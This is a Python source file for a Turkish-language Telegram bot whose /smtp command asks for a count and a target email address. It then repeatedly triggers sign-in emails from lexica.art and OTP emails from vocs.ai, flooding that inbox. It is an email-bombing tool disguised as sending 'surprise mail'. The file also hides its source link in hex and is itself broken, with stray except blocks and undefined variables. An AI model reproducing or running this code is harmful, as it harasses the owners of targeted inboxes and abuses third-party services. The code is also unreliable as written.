#-----------CREDITS -----------
# telegram : @legend_coder
# github : noob-mukesh
# Powered By Deep seek

import os
from pyrogram import Client, filters,enums,idle
from pyrogram.errors import ApiIdInvalid, ApiIdPublishedFlood, AccessTokenInvalid
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from pyrogram.enums import ChatAction, ParseMode
from pyrogram.types import CallbackQuery
from config import *
import requests
import threading
import json
from pyrogram import filters
import os,sys,re,requests
import asyncio,time
from random import choice
from datetime import datetime
import logging

FORMAT = "[LEGEND-MUKESH] %(message)s"
logging.basicConfig(
    level=logging.WARNING, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)


StartTime = time.time()
Mukesh = Client(
    "chat-gpt" ,
    api_id = API_ID,
    api_hash = API_HASH ,
    bot_token = BOT_TOKEN
)
START = f"""
๏ 𝗠𝗲𝗿𝗵𝗮𝗯𝗮 🌹

Süpriz Mail Kutusuna Hediye bırakabilirim Ama Noel Baba Değilim 
"""
xa = bytearray.fromhex("68 74 74 70 73 3A 2F 2F 67 69 74 68 75 62 2E 63 6F 6D 2F 4E 6F 6F 62 2D 6D 75 6B 65 73 68 2F 43 68 61 74 67 70 74 2D 62 6F 74").decode()
SOURCE = xa
SOURCE_TEXT = f"""
๏ ʜᴇʏ,
"""


x=["❤️","🎉","✨","🪸","🎉","🎈","🎯"]
g=choice(x)
MAIN = [
    [
        InlineKeyboardButton(text="Sahip", url=f"https://t.me/{OWNER_USERNAME}")
    ],
    [
        InlineKeyboardButton(
            text="Gruba Ekle",
            url=f"https://t.me/{BOT_USERNAME}?startgroup=true",
        ),
    ],
    [
        InlineKeyboardButton(text="Yardım Komutlar ", callback_data="HELP"),
    ],
]
X = [
    [
        InlineKeyboardButton(text=" Kanal ", url=f"https://t.me/{SUPPORT_GRP}"),
    ]
    ]
    
PNG_BTN = [
    [
         InlineKeyboardButton(
             text="Gruba Ekle",
             url=f"https://t.me/{BOT_USERNAME}?startgroup=true",
         ),
     ],
     [
         InlineKeyboardButton(text="Grup", 
                              url=f"https://t.me/{SUPPORT_GRP}",
         ),
     ],
]
SOURCE_BUTTONS = InlineKeyboardMarkup([[InlineKeyboardButton('source', url=f"{SOURCE}")]])
HELP_READ = "**Kullanım :**  \n\n /smtp = Süpriz Mail Gönder\n\n /ping = Bot Sağlık Sorunları\n\n /plus = Anonim Davetiye Yolla\n\n Bot Version2.1"
HELP_BACK = [
     [
           InlineKeyboardButton(text="Source ", url=f"https://github.com/ViosRio/MailPostBot"),
           
     ],
    [
           InlineKeyboardButton(text="⬅️ ", callback_data="HELP_BACK"),
    ],
]

  
#         start
@Mukesh.on_message(filters.command(["start",f"start@{BOT_USERNAME}"]))
async def start(client, m: Message):
    try:
        accha = await m.reply_text(
                        text = f"{g}")
        await asyncio.sleep(0.2)
        await accha.edit("✦ Yükleniliyor..")
        await asyncio.sleep(0.2)
        await accha.delete()
        umm = await m.reply_sticker(
                  sticker = STKR,
        )
        await asyncio.sleep(0.3)
        await umm.delete()
        await m.reply_photo(
            photo = START_IMG,
            caption=START,
            reply_markup=InlineKeyboardMarkup(MAIN),
        )
    except Exception as y:
        await m.reply(y)
#  callback 
@Mukesh.on_callback_query()
async def cb_handler(Client, query: CallbackQuery):
    if query.data == "HELP":
     await query.message.edit_text(
                      text = HELP_READ,
                      reply_markup = InlineKeyboardMarkup(HELP_BACK),
     )
    elif query.data == "HELP_BACK":
            await query.message.edit(text = START,
                  reply_markup=InlineKeyboardMarkup(MAIN),
        )
    
@Mukesh.on_message(filters.command(["help", f"help@{BOT_USERNAME}"], prefixes=["","+", ".", "/", "-", "?", "$"]))
async def restart(client, message):
    hmm = await message.reply_photo(START_IMG,
                        caption=HELP_READ,
                        reply_markup= InlineKeyboardMarkup(HELP_BACK),
       )
@Mukesh.on_message(filters.command(['source', 'repo'], prefixes=["","+", ".", "/", "-", "?", "$"]))
async def source(bot, m):
    
    await m.reply_photo(START_IMG, caption=SOURCE_TEXT, reply_markup=SOURCE_BUTTONS)
#  alive
@Mukesh.on_message(filters.command(["ping","alive"], prefixes=["+", "/", "-", "?", "$", "&","."]))
async def ping(client, message: Message):
        start = datetime.now()
        t = "Bekleyiniz.."
        txxt = await message.reply(t)
        await asyncio.sleep(0.25)
        await txxt.edit_text("✦ Başarılı..")
        await asyncio.sleep(0.35)
        await txxt.delete()
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await message.reply_photo(
                             photo=START_IMG,
                             caption=f"Hey !!\n**[{BOT_NAME}](t.me/{BOT_USERNAME}) `{ms}` ms\n\n**🌹 || [sahip](https://t.me/{OWNER_USERNAME})||",
                             reply_markup=InlineKeyboardMarkup(PNG_BTN),
       )




@Mukesh.on_message(filters.command(["send", "smtp"]))
async def smtp_command_handler(client: Client, message: Message):
    await message.reply("Kaç defa göndermek istiyorsun? (sayı yaz)")
    Mukesh.add_handler(filters.text & filters.private, process_count, group=1)

async def process_count(client: Client, message: Message):
    try:
        count = int(message.text.strip())
        data_store[message.chat.id] = {"count": count}
        await message.reply("E-posta adresini gir:")
        Mukesh.add_handler(filters.text & filters.private, process_email, group=2)
    except ValueError:
        await message.reply("Geçerli bir sayı gir.")

async def process_email(client: Client, message: Message):
    email = message.text.strip()
    chat_id = message.chat.id
    if chat_id in data_store and "count" in data_store[chat_id]:
        data_store[chat_id]["email"] = email
        await message.reply(f"{email} kayıt edildi, başlıyorum...")
        csrf_token, csrf_token0 = get_csrf_tokens()
        if csrf_token and csrf_token0:
            count = data_store[chat_id]["count"]
            threading.Thread(target=send_emails, args=(csrf_token, csrf_token0, email, count, chat_id)).start()
        else:
            await message.reply("CSRF token alınamadı.")
    else:
        await message.reply("Önce kaç defa göndereceğini belirtmelisin.")

def get_csrf_tokens():
    url = "https://lexica.art/api/auth/csrf"
    headers = {
        'User-Agent': "Mozilla/5.0 (Android)",
    }
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            data = response.json()
            csrf_token = data.get("csrfToken")
            csrf_token0 = response.cookies.get("__Host-next-auth.csrf-token")
            return csrf_token, csrf_token0
    except Exception as e:
        print(f"Hata: {e}")
    return None, None

def send_email_request(csrf_token, csrf_token0, email):
    url = "https://lexica.art/api/auth/signin/email"
    payload = f"email={email}&redirect=false&callbackUrl=https%3A%2F%2Flexica.art%2Faccount&csrfToken={csrf_token}"
    headers = {
        'User-Agent': "Mozilla/5.0",
        'Content-Type': "application/x-www-form-urlencoded",
        'Cookie': f"__Host-next-auth.csrf-token={csrf_token0}; __Secure-next-auth.callback-url=https%3A%2F%2Flexica.art"
    }
    return requests.post(url, data=payload, headers=headers)

def send_emails(csrf_token, csrf_token0, email, count, chat_id):
    for i in range(count):
        res1 = send_email_request(csrf_token, csrf_token0, email)
        Mukesh.send_message(chat_id, f"Lexica Email {i+1} {'✅' if res1.status_code == 200 else f'❌ ({res1.status_code})'}")
        
        res2 = requests.post(
            "https://backend.vocs.ai/api/user/sendotp",
            headers={
                'User-Agent': "Mozilla/5.0",
                'Content-Type': "application/json",
                'origin': "https://www.vocs.ai"
            },
            data=json.dumps({"email": email})
        )
        Mukesh.send_message(chat_id, f"Vocs OTP {i+1} {'✅' if res2.status_code == 200 else f'❌ ({res2.status_code})'}")

    Mukesh.send_message(chat_id, "✅ İşlem tamamlandı.")

s = bytearray.fromhex("68 74 74 70 73 3A 2F 2F 67 69 74 68 75 62 2E 63 6F 6D 2F 4E 6F 6F 62 2D 6D 75 6B 65 73 68 2F 43 68 61 74 67 70 74 2D 62 6F 74").decode()

if SOURCE != s:
    print("So sad, you have changed source, change it back to ` https://github.com/Noob-mukesh/Chatgpt-bot `  else I won't work")
    sys.exit(1)  
        
        
    except (ApiIdInvalid, ApiIdPublishedFlood):
        raise Exception("Your API_ID/API_HASH is not valid.")
    except AccessTokenInvalid:
        raise Exception("Your BOT_TOKEN is not valid.")
    print(f"""JOIN  @MR_SUKKUN
GIVE STAR TO THE REPO 
 {BOT_NAME} Başarılı !  
    """)
    idle()
    Mukesh.stop()
    print("Bot stopped. Bye !")
#-----------CREDITS -----------
# telegram : @legend_coder
# github : noob-mukesh
